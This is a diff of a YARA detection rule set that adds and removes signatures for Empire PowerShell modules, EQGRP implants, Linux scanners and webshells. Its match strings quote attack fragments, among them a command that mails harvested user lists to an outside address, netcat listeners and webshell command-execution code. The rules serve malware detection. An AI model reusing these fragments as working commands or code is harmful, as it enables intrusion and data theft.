-      date = "2016-11-05 12:31:01"
-      score = 75
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      hash1 = "00c0479f83c3dbbeff42f4ab9b71ca5fe8cd5061cb37b7b6861c73c54fd96d3e"
-      tags = "DEMO, SCRIPT, T1059, T1059_001"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $s1 = "# upload to a specified exfil URI" fullword ascii
-      $s2 = "Server path to exfil to." fullword ascii
-   condition: 
-      ( uint16 ( 0 ) == 0x490a and filesize < 2KB and 1 of them ) or all of them
-}
-
-rule Empire_Invoke_SMBAutoBrute_RID311A : DEMO SCRIPT T1059 T1059_001 {
-   meta:
-      description = "Detects Empire component - file Invoke-SMBAutoBrute.ps1"
-      author = "Florian Roth"
-      reference = "https://github.com/adaptivethreat/Empire"
-      date = "2016-11-05 13:08:11"
-      score = 75
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      hash1 = "7950f8abdd8ee09ed168137ef5380047d9d767a7172316070acc33b662f812b2"
-      tags = "DEMO, SCRIPT, T1059, T1059_001"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $s1 = "[*] PDC: LAB-2008-DC1.lab.com" fullword ascii
-      $s2 = "$attempts = Get-UserBadPwdCount $userid $dcs" fullword ascii
-   condition: 
-      ( uint16 ( 0 ) == 0x7566 and filesize < 30KB and 1 of them ) or all of them
-}
-
-rule Empire_Get_Keystrokes_RID2F85 : DEMO SCRIPT T1059 T1059_001 {
-   meta:
-      description = "Detects Empire component - file Get-Keystrokes.ps1"
-      author = "Florian Roth"
-      reference = "https://github.com/adaptivethreat/Empire"
-      date = "2016-11-05 12:00:41"
-      score = 75
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      hash1 = "c36e71db39f6852f78df1fa3f67e8c8a188bf951e96500911e9907ee895bf8ad"
-      tags = "DEMO, SCRIPT, T1059, T1059_001"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $s1 = "$RightMouse   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RButton) -band 0x8000) -eq 0x8000" fullword ascii
-   condition: 
-      ( uint16 ( 0 ) == 0x7566 and filesize < 30KB and 1 of them ) or all of them
-}
-
-rule Empire_Invoke_DllInjection_RID315C : DEMO SCRIPT T1055_001 T1059 T1059_001 {
-   meta:
-      description = "Detects Empire component - file Invoke-DllInjection.ps1"
-      author = "Florian Roth"
-      reference = "https://github.com/adaptivethreat/Empire"
-      date = "2016-11-05 13:19:11"
-      score = 75
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      hash1 = "304031aa9eca5a83bdf1f654285d86df79cb3bba4aa8fe1eb680bd5b2878ebf0"
-      tags = "DEMO, SCRIPT, T1055_001, T1059, T1059_001"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $s1 = "-Dll evil.dll" fullword ascii
-   condition: 
-      ( uint16 ( 0 ) == 0x7566 and filesize < 40KB and 1 of them ) or all of them
-}
-
-rule Empire_KeePassConfig_RID2ED4 : DEMO SCRIPT T1059 T1059_001 {
-   meta:
-      description = "Detects Empire component - file KeePassConfig.ps1"
-      author = "Florian Roth"
-      reference = "https://github.com/adaptivethreat/Empire"
-      date = "2016-11-05 11:31:11"
-      score = 75
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      hash1 = "5a76e642357792bb4270114d7cd76ce45ba24b0d741f5c6b916aeebd45cff2b3"
-      tags = "DEMO, SCRIPT, T1059, T1059_001"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $s1 = "$UserMasterKeyFiles = @(, $(Get-ChildItem -Path $UserMasterKeyFolder -Force | Select-Object -ExpandProperty FullName) )" fullword ascii
-   condition: 
-      ( uint16 ( 0 ) == 0x7223 and filesize < 80KB and 1 of them ) or all of them
-}
-
-rule Empire_Invoke_SSHCommand_RID304A : DEMO SCRIPT T1059 T1059_001 {
-   meta:
-      description = "Detects Empire component - file Invoke-SSHCommand.ps1"
-      author = "Florian Roth"
-      reference = "https://github.com/adaptivethreat/Empire"
-      date = "2016-11-05 12:33:31"
-      score = 75
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      hash1 = "cbaf086b14d5bb6a756cbda42943d4d7ef97f8277164ce1f7dd0a1843e9aa242"
-      tags = "DEMO, SCRIPT, T1059, T1059_001"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $s1 = "$Base64 = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAA" ascii
-      $s2 = "Invoke-SSHCommand -ip 192.168.1.100 -Username root -Password test -Command \"id\"" fullword ascii
-      $s3 = "Write-Verbose \"[*] Error loading dll\"" fullword ascii
-   condition: 
-      ( uint16 ( 0 ) == 0x660a and filesize < 2000KB and 1 of them ) or all of them
-}
-
-rule Empire_PowerUp_Gen_RID2E1D : DEMO GEN SCRIPT T1059 T1059_001 {
-   meta:
-      description = "Detects Empire component - from files PowerUp.ps1, PowerUp.ps1"
-      author = "Florian Roth"
-      reference = "https://github.com/adaptivethreat/Empire"
-      date = "2016-11-05 11:00:41"
-      score = 75
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      hash1 = "ad9a5dff257828ba5f15331d59dd4def3989537b3b6375495d0c08394460268c"
-      tags = "DEMO, GEN, SCRIPT, T1059, T1059_001"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $s1 = "$Result = sc.exe config $($TargetService.Name) binPath= $OriginalPath" fullword ascii
-      $s2 = "$Result = sc.exe pause $($TargetService.Name)" fullword ascii
-   condition: 
-      ( uint16 ( 0 ) == 0x233c and filesize < 2000KB and 1 of them ) or all of them
-}
-
-rule Empire_Agent_Gen_RID2D3A : DEMO GEN SCRIPT T1059 T1059_001 {
-   meta:
-      description = "Detects Empire component - from files agent.ps1, agent.ps1"
-      author = "Florian Roth"
-      reference = "https://github.com/adaptivethreat/Empire"
-      date = "2016-11-05 10:22:51"
-      score = 75
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      hash1 = "380fd09bfbe47d5c8c870c1c97ff6f44982b699b55b61e7c803d3423eb4768db"
-      tags = "DEMO, GEN, SCRIPT, T1059, T1059_001"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $s1 = "$wc.Headers.Add(\"User-Agent\",$script:UserAgent)" fullword ascii
-      $s2 = "$min = [int]((1-$script:AgentJitter)*$script:AgentDelay)" fullword ascii
-      $s3 = "if ($script:AgentDelay -ne 0){" fullword ascii
-   condition: 
-      ( uint16 ( 0 ) == 0x660a and filesize < 100KB and 1 of them ) or all of them
-}
-
-rule Empire_Invoke_InveighRelay_Gen_RID32DD : DEMO GEN SCRIPT T1059 T1059_001 {
-   meta:
-      description = "Detects Empire component - from files Invoke-InveighRelay.ps1, Invoke-InveighRelay.ps1"
-      author = "Florian Roth"
-      reference = "https://github.com/adaptivethreat/Empire"
-      date = "2016-11-05 14:23:21"
-      score = 75
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      hash2 = "21b90762150f804485219ad36fa509aeda210d46453307a9761c816040312f41"
-      tags = "DEMO, GEN, SCRIPT, T1059, T1059_001"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $s1 = "$inveigh.SMBRelay_failed_list.Add(\"$HTTP_NTLM_domain_string\\$HTTP_NTLM_user_string $SMBRelayTarget\")" fullword ascii
-      $s2 = "$NTLM_challenge_base64 = [System.Convert]::ToBase64String($HTTP_NTLM_bytes)" fullword ascii
-   condition: 
-      ( uint16 ( 0 ) == 0x7566 and filesize < 200KB and 1 of them ) or all of them
-}
-
-rule Empire_KeePassConfig_Gen_RID304D : DEMO GEN SCRIPT T1059 T1059_001 {
-   meta:
-      description = "Detects Empire component - from files KeePassConfig.ps1, KeePassConfig.ps1"
-      author = "Florian Roth"
-      reference = "https://github.com/adaptivethreat/Empire"
-      date = "2016-11-05 12:34:01"
-      score = 75
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      hash2 = "5a76e642357792bb4270114d7cd76ce45ba24b0d741f5c6b916aeebd45cff2b3"
-      tags = "DEMO, GEN, SCRIPT, T1059, T1059_001"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $s1 = "$KeePassXML = [xml](Get-Content -Path $KeePassXMLPath)" fullword ascii
-   condition: 
-      ( uint16 ( 0 ) == 0x7223 and filesize < 80KB and 1 of them ) or all of them
-}
-
-rule Empire_Invoke_Portscan_Gen_RID3160 : DEMO GEN SCRIPT T1059 T1059_001 {
-   meta:
-      description = "Detects Empire component - from files Invoke-Portscan.ps1, Invoke-Portscan.ps1"
-      author = "Florian Roth"
-      reference = "https://github.com/adaptivethreat/Empire"
-      date = "2016-11-05 13:19:51"
-      score = 75
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      hash2 = "cf7030be01fab47e79e4afc9e0d4857479b06a5f68654717f3bc1bc67a0f38d3"
-      tags = "DEMO, GEN, SCRIPT, T1059, T1059_001"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $s1 = "Test-Port -h $h -p $Port -timeout $Timeout" fullword ascii
-      $s2 = "1 {$nHosts=10;  $Threads = 32;   $Timeout = 5000 }" fullword ascii
-   condition: 
-      ( uint16 ( 0 ) == 0x7566 and filesize < 100KB and 1 of them ) or all of them
-}
-
-rule Empire_Invoke_Gen_RID2DB7 : DEMO GEN SCRIPT T1059 T1059_001 {
-   meta:
-      description = "Detects Empire component - from files Invoke-DCSync.ps1, Invoke-PSInject.ps1, Invoke-ReflectivePEInjection.ps1"
-      author = "Florian Roth"
-      reference = "https://github.com/adaptivethreat/Empire"
-      date = "2016-11-05 10:43:41"
-      score = 75
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      hash1 = "a3428a7d4f9e677623fadff61b2a37d93461123535755ab0f296aa3b0396eb28"
-      hash2 = "61e5ca9c1e8759a78e2c2764169b425b673b500facaca43a26c69ff7e09f62c4"
-      hash3 = "eaff29dd0da4ac258d85ecf8b042d73edb01b4db48c68bded2a8b8418dc688b5"
-      tags = "DEMO, GEN, SCRIPT, T1059, T1059_001"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $s1 = "$Shellcode1 += 0x48" fullword ascii
-      $s2 = "$PEHandle = [IntPtr]::Zero" fullword ascii
-   condition: 
-      ( uint16 ( 0 ) == 0x7566 and filesize < 3000KB and 1 of them ) or all of them
-}
-
-rule Empire_PowerShell_Framework_Gen5_RID3392 : DEMO SCRIPT T1059 T1059_001 {
-   meta:
-      description = "Detects Empire component - from files Invoke-CredentialInjection.ps1, Invoke-PSInject.ps1, Invoke-ReflectivePEInjection.ps1"
-      author = "Florian Roth"
-      reference = "https://github.com/adaptivethreat/Empire"
-      date = "2016-11-05 14:53:31"
-      score = 75
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      hash1 = "1be3e3ec0e364db0c00fad2c59c7041e23af4dd59c4cc7dc9dcf46ca507cd6c8"
-      hash2 = "61e5ca9c1e8759a78e2c2764169b425b673b500facaca43a26c69ff7e09f62c4"
-      hash3 = "eaff29dd0da4ac258d85ecf8b042d73edb01b4db48c68bded2a8b8418dc688b5"
-      tags = "DEMO, SCRIPT, T1059, T1059_001"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $s1 = "if ($ExeArgs -ne $null -and $ExeArgs -ne '')" fullword ascii
-      $s2 = "$ExeArgs = \"ReflectiveExe $ExeArgs\"" fullword ascii
-   condition: 
-      ( uint16 ( 0 ) == 0x7566 and filesize < 1000KB and 1 of them ) or all of them
-}
-
 rule MSBuild_Mimikatz_Execution_via_XML_RID3448 : DEMO S0002 SUSP T1003 T1127_001 T1134_005 T1550_002 T1550_003 {
    meta:
       description = "Detects an XML that executes Mimikatz on an endpoint via MSBuild"
@@ -10881,6 +11045,26 @@ rule APT_EQGRP_uninstallPBD_RID2EE3 : APT DEMO SCRIPT {
       all of them
 }
 
+rule APT_EQGRP_tinyexec_RID2D9C : APT DEMO FILE {
+   meta:
+      description = "EQGRP Toolset Firewall - from files tinyexec"
+      author = "Florian Roth"
+      reference = "Research"
+      date = "2016-08-16 10:39:11"
+      score = 75
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      
+      tags = "APT, DEMO, FILE"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $s1 = { 73 68 73 74 72 74 61 62 00 2E 74 65 78 74 } 
+      $s2 = { 5A 58 55 52 89 E2 55 50 89 E1 } 
+   condition: 
+      uint32 ( 0 ) == 0x464c457f and filesize < 270 and all of them
+}
+
 rule APT_EQGRP_callbacks_RID2DD3 : APT DEMO {
    meta:
       description = "EQGRP Toolset Firewall - Callback addresses"
@@ -10918,6 +11102,25 @@ rule APT_EQGRP_Unique_Strings_RID2FF3 : APT DEMO {
       $s2 = "Protocol must be either http or https (Ex: https://1.2.3.4:1234)" 
    condition: 
       1 of them
+}
+
+rule APT_install_get_persistent_filenames_RID35AE : APT DEMO FILE {
+   meta:
+      description = "EQGRP Toolset Firewall - file install_get_persistent_filenames"
+      author = "Florian Roth"
+      reference = "Research"
+      date = "2016-08-16 16:23:31"
+      score = 75
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      hash1 = "4a50ec4bf42087e932e9e67e0ea4c09e52a475d351981bb4c9851fda02b35291"
+      tags = "APT, DEMO, FILE"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $s1 = "Generates the persistence file name and prints it out." ascii fullword
+   condition: 
+      ( uint16 ( 0 ) == 0x457f and all of them )
 }
 
 rule APT_EQGRP_tunnel_state_reader_RID321B : APT DEMO {
@@ -11206,6 +11409,30 @@ rule APT_EQGRP_StoreFc_RID2CE9 : APT DEMO SCRIPT {
       1 of them
 }
 
+rule APT_EQGRP_Implants_Gen5_RID2F29 : APT DEMO FILE {
+   meta:
+      description = "EQGRP Toolset Firewall - from files BananaUsurper-2120, BARPUNCH-3110, BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120, BPICKER-3100, writeJetPlow-2130"
+      author = "Florian Roth"
+      reference = "Research"
+      date = "2016-08-16 11:45:21"
+      score = 75
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      hash1 = "3366b4bbf265716869a487203a8ac39867920880990493dd4dd8385e42b0c119"
+      hash2 = "830538fe8c981ca386c6c7d55635ac61161b23e6e25d96280ac2fc638c2d82cc"
+      hash3 = "05031898f3d52a5e05de119868c0ec7caad3c9f3e9780e12f6f28b02941895a4"
+      tags = "APT, DEMO, FILE"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $x1 = "Module and Implant versions do not match.  This module is not compatible with the target implant" ascii fullword
+      $s1 = "%s/BF_READ_%08x_%04d%02d%02d_%02d%02d%02d.log" ascii fullword
+      $s2 = "%s/BF_%04d%02d%02d.log" ascii fullword
+      $s3 = "%s/BF_READ_%08x_%04d%02d%02d_%02d%02d%02d.bin" ascii fullword
+   condition: 
+      ( uint16 ( 0 ) == 0x457f and 1 of ( $x* ) ) or ( all of them )
+}
+
 rule APT_EQGRP_Extrabacon_Output_RID312A : APT DEMO {
    meta:
       description = "EQGRP Toolset Firewall - Extrabacon exploit output"
@@ -11227,6 +11454,26 @@ rule APT_EQGRP_Extrabacon_Output_RID312A : APT DEMO {
       $s5 = "appended AAAADMINAUTH_ENABLE payload" ascii fullword
    condition: 
       2 of them
+}
+
+rule APT_EQGRP_bc_parser_RID2DE4 : APT DEMO FILE {
+   meta:
+      description = "Detects tool from EQGRP toolset - file bc-parser"
+      author = "Florian Roth"
+      reference = "Research"
+      date = "2016-08-15 10:51:11"
+      score = 75
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      hash1 = "879f2f1ae5d18a3a5310aeeafec22484607649644e5ecb7d8a72f0877ac19cee"
+      tags = "APT, DEMO, FILE"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $s1 = "*** Target may be susceptible to FALSEMOREL      ***" ascii fullword
+      $s2 = "*** Target is susceptible to FALSEMOREL          ***" ascii fullword
+   condition: 
+      uint16 ( 0 ) == 0x457f and 1 of them
 }
 
 rule APT_Project_Sauron_arping_module_RID33C8 : APT DEMO G0041 {
@@ -11574,6 +11821,50 @@ rule kerberoast_PY_RID2C4B : DEMO HKTL SCRIPT T1558_003 {
       2 of them
 }
 
+rule Linux_Portscan_Shark_1_RID2FB2 : DEMO FILE HKTL LINUX T1046 {
+   meta:
+      description = "Detects Linux Port Scanner Shark"
+      author = "Florian Roth"
+      reference = "Virustotal Research - see https://github.com/Neo23x0/Loki/issues/35"
+      date = "2016-04-01 12:08:11"
+      score = 75
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      hash1 = "4da0e535c36c0c52eaa66a5df6e070c52e7ddba13816efc3da5691ea2ec06c18"
+      hash2 = "e395ca5f932419a4e6c598cae46f17b56eb7541929cdfb67ef347d9ec814dea3"
+      tags = "DEMO, FILE, HKTL, LINUX, T1046"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $s0 = "rm -rf scan.log session.txt" ascii fullword
+      $s17 = "*** buffer overflow detected ***: %s terminated" ascii fullword
+      $s18 = "*** stack smashing detected ***: %s terminated" ascii fullword
+   condition: 
+      ( uint16 ( 0 ) == 0x7362 and all of them )
+}
+
+rule Linux_Portscan_Shark_2_RID2FB3 : DEMO HKTL LINUX T1046 {
+   meta:
+      description = "Detects Linux Port Scanner Shark"
+      author = "Florian Roth"
+      reference = "Virustotal Research - see https://github.com/Neo23x0/Loki/issues/35"
+      date = "2016-04-01 12:08:21"
+      score = 75
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      hash1 = "5f80bd2db608a47e26290f3385eeb5bfc939d63ba643f06c4156704614def986"
+      hash2 = "90af44cbb1c8a637feda1889d301d82fff7a93b0c1a09534909458a64d8d8558"
+      tags = "DEMO, HKTL, LINUX, T1046"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $s1 = "usage: %s <fisier ipuri> <fisier useri:parole> <connect timeout> <fail2ban wait> <threads> <outfile> <port>" ascii fullword
+      $s2 = "Difference between server modulus and host modulus is only %d. It's illegal and may not work" ascii fullword
+      $s3 = "rm -rf scan.log" ascii fullword
+   condition: 
+      all of them
+}
+
 rule FourElementSword_Config_File_RID321A : DEMO MAL {
    meta:
       description = "Detects FourElementSword Malware"
@@ -11753,7 +12044,7 @@ rule Codoso_PGV_PVID_1_RID2CE6 : DEMO EXE G0073 MAL {
       ( uint16 ( 0 ) == 0x5a4d and ( 1 of ( $x* ) or 3 of them ) ) or 5 of them
 }
 
-rule Payload_Exe2Hex_RID2CB3 : DEMO SCRIPT T1059 {
+rule Payload_Exe2Hex_RID2CB3 : DEMO SCRIPT {
    meta:
       description = "Detects payload generated by exe2hex"
       author = "Florian Roth"
@@ -11763,7 +12054,7 @@ rule Payload_Exe2Hex_RID2CB3 : DEMO SCRIPT T1059 {
       customer = "demo"
       license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
       
-      tags = "DEMO, SCRIPT, T1059"
+      tags = "DEMO, SCRIPT"
       minimum_yara = "3.5.0"
       
    strings:
@@ -12312,6 +12603,26 @@ rule CN_Honker_Webshell_cfm_xl_RID30D5 : CHINA DEMO FILE T1505_003 WEBSHELL {
       $s1 = "<CFFILE ACTION=\"Write\" FILE=\"#Form.path#\" OUTPUT=\"#Form.cmd#\">" fullword ascii
    condition: 
       uint16 ( 0 ) == 0x433c and filesize < 13KB and all of them
+}
+
+rule CN_Honker_Webshell_PHP_linux_RID31D3 : CHINA DEMO FILE LINUX T1505_003 WEBSHELL {
+   meta:
+      description = "Webshell from CN Honker Pentest Toolset - file linux.txt"
+      author = "Florian Roth"
+      reference = "Disclosed CN Honker Pentest Toolset"
+      date = "2015-06-23 13:39:01"
+      score = 70
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      
+      tags = "CHINA, DEMO, FILE, LINUX, T1505_003, WEBSHELL"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $s0 = "<form name=form1 action=exploit.php method=post>" fullword ascii
+      $s1 = "<title>Changing CHMOD Permissions Exploit " fullword ascii
+   condition: 
+      uint16 ( 0 ) == 0x696c and filesize < 6KB and all of them
 }
 
 rule CN_Honker_Webshell_Interception3389_get_RID35C6 : CHINA DEMO T1505_003 WEBSHELL {
@@ -13318,6 +13629,25 @@ rule CN_Honker_Webshell_PHP_php4_RID311F : CHINA DEMO FILE T1505_003 WEBSHELL {
       $s0 = "nc -l -vv -p port(" ascii
    condition: 
       uint16 ( 0 ) == 0x4850 and filesize < 1KB and all of them
+}
+
+rule CN_Honker_Webshell_Linux_2_6_Exploit_RID34D6 : CHINA DEMO EXPLOIT LINUX T1505_003 WEBSHELL {
+   meta:
+      description = "Webshell from CN Honker Pentest Toolset - file 2.6.9"
+      author = "Florian Roth"
+      reference = "Disclosed CN Honker Pentest Toolset"
+      date = "2015-06-23 15:47:31"
+      score = 70
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      
+      tags = "CHINA, DEMO, EXPLOIT, LINUX, T1505_003, WEBSHELL"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $s0 = "[+] Failed to get root :( Something's wrong.  Maybe the kernel isn't vulnerable?" fullword ascii
+   condition: 
+      filesize < 56KB and all of them
 }
 
 rule CN_Honker_Webshell_ASP_asp2_RID3115 : CHINA DEMO T1505_003 WEBSHELL {
@@ -15761,6 +16091,30 @@ rule ASPXspy2_RID29DB : DEMO SCRIPT T1505_003 WEBSHELL {
       6 of them
 }
 
+rule LinuxHacktool_eyes_a_RID2F2B : DEMO HKTL LINUX {
+   meta:
+      description = "Linux hack tools - file a"
+      author = "Florian Roth"
+      reference = "not set"
+      date = "2015-01-19 11:45:41"
+      score = 75
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      
+      tags = "DEMO, HKTL, LINUX"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $s0 = "cat trueusers.txt | mail -s \"eyes\" clubby@slucia.com" ascii fullword
+      $s1 = "mv scan.log bios.txt" ascii fullword
+      $s2 = "rm -rf bios.txt" ascii fullword
+      $s3 = "echo -e \"# by Eyes.\"" ascii fullword
+      $s4 = "././pscan2 $1 22" ascii fullword
+      $s10 = "echo \"#cautam...\"" ascii fullword
+   condition: 
+      2 of them
+}
+
 rule FiveEyes_QUERTY_Malwaresig_20121_dll_RID33D5 : APT DEMO {
    meta:
       description = "FiveEyes QUERTY Malware - file 20121.dll.bin"
@@ -16932,7 +17286,7 @@ rule JSP_Browser_APT_webshell_RID303A : APT DEMO SCRIPT T1505_003 WEBSHELL {
       all of them
 }
 
-rule Powershell_Netcat_RID2DF4 : DEMO SCRIPT T1059 T1059_001 {
+rule Powershell_Netcat_RID2DF4 : DEMO SCRIPT T1059_001 {
    meta:
       description = "Detects a Powershell version of the Netcat network hacking tool"
       author = "Florian Roth"
@@ -16942,7 +17296,7 @@ rule Powershell_Netcat_RID2DF4 : DEMO SCRIPT T1059 T1059_001 {
       customer = "demo"
       license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
       
-      tags = "DEMO, SCRIPT, T1059, T1059_001"
+      tags = "DEMO, SCRIPT, T1059_001"
       minimum_yara = "3.5.0"
       
    strings:
@@ -21989,6 +22343,26 @@ rule Webshell_mysql_php_php_RID302A : DEMO T1505_003 WEBSHELL {
       1 of them
 }
 
+rule Webshell_Worse_Linux_Shell_php_RID3323 : DEMO LINUX SCRIPT T1505_003 WEBSHELL {
+   meta:
+      description = "Semi-Auto-generated - file Worse Linux Shell.php.txt"
+      author = "Florian Roth"
+      reference = "-"
+      date = "2014-03-29 14:35:01"
+      score = 75
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      
+      tags = "DEMO, LINUX, SCRIPT, T1505_003, WEBSHELL"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $s1 = "print \"<tr><td><b>Server is:</b></td><td>\".$_SERVER['SERVER_SIGNATURE'].\"</td" 
+      $s2 = "print \"<tr><td><b>Execute command:</b></td><td><input size=100 name=\\\"_cmd" 
+   condition: 
+      1 of them
+}
+
 rule Webshell_cyberlords_sql_php_php_RID33DC : DEMO T1505_003 WEBSHELL {
    meta:
       description = "Semi-Auto-generated - file cyberlords_sql.php.php.txt"
@@ -25317,6 +25691,25 @@ rule Webshell_ASP_zehir_RID2E0B : DEMO SCRIPT T1505_003 WEBSHELL {
       all of them
 }
 
+rule Webshell_Worse_Linux_Shell_1_RID320C : DEMO LINUX SCRIPT T1505_003 WEBSHELL {
+   meta:
+      description = "Web Shell - file Worse Linux Shell.php"
+      author = "Florian Roth"
+      reference = "-"
+      date = "2014-01-28 13:48:31"
+      score = 70
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      
+      tags = "DEMO, LINUX, SCRIPT, T1505_003, WEBSHELL"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $s0 = "system(\"mv \".$_FILES['_upl']['tmp_name'].\" \".$currentWD" 
+   condition: 
+      all of them
+}
+
 rule Webshell_zacosmall_RID2E6C : DEMO SCRIPT T1505_003 WEBSHELL {
    meta:
       description = "Web Shell - file zacosmall.php"
@@ -27456,3 +27849,14 @@ rule StoneDrill_BAT_1_RID2CD7 : APT DEMO FILE MIDDLE_EAST SCRIPT {
    condition: 
       uint32 ( 0 ) == 0x68636540 and filesize < 500 and 2 of them
 }
+
+/*
+    VALHALLA YARA RULE SET
+    Retrieved: 2026-10-02 13:41
+    Generated for User: demo
+    Number of Rules: 1256
+
+    This is the VALHALLA demo rule set. The content represents the 'signature-base' repository
+    in a streamlined format but lacks the rules provided by 3rd parties.
+    All rules are licensed under CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/.
+*/
